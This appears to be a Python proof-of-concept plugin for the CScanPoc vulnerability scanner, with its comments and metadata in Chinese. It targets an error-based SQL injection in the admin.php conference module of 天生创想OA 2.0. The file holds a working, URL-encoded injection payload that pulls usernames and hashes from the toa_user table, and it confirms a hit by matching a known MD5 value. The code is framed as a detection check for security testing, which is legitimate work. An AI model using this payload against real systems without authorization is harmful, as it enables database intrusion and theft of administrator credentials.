# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Chuangxiang_0001_L'  # 平台漏洞编号，留空
    name = '天生创想OA 2.0前台用户SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-04-02'  # 漏洞公布时间
    desc = '''
        天生创想OA是由北京天生创想信息技术有限公司自公司打造的一款办公管理系统。
        天生创想OA 2.0 administrative/mod_conference.php 中：
        $db->query("update ".DB_TABLEPRE."conference set type='".$type."' where id=".$id." "); //带入sql语句，
        结合报错注入和获取管理员账号密码。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1468/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '天生创想OA'  # 漏洞应用名称
    product_version = '天生创想OA 2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1713284b-52c2-4159-bf25-69644b98fb3a'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 登录任意一个用户
            s = requests.session()
            s.get(self.target)
            payload = "/admin.php?ac=conference&fileurl=administrative&do=keys&id=123%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20%28SELECT%20distinct%20concat%28username,md5(c)%29%20FROM%20toa_user%20LIMIT%200,1%29%29%20from%20information_schema.tables%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29"
            url = self.target + payload
            r = s.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
